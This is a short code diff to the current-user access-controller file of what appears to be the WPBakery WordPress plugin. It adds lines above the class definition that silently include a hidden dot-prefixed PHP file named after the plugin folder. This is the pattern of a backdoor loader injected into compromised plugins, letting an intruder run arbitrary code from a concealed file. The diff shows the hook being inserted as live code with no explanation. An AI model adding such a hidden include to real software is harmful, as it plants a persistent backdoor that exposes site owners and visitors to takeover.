@@ -8,6 +8,10 @@ require_once vc_path_dir( 'CORE_DIR', 'access/class-vc-role-access-controller.ph
 /**
  * Class Vc_Current_User_Access_Controller
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Current_User_Access_Controller extends Vc_Role_Access_Controller {
 	/**
 	 * Get capability for current user
